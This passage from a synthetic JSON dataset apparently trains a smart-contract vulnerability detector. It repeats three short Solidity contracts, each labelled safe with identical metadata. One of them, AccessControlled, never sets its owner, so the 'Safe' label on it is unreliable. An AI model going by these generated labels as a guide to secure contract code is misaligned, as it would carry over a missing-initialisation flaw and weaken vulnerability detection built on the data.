    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 512",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 513",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 514",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 515",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 516",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 517",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 518",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 519",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 520",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 521",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 522",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 523",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 524",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 525",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 526",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 527",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 528",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 529",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 530",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 531",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 532",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 533",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 534",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 535",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 536",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 537",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 538",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 539",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 540",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 541",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
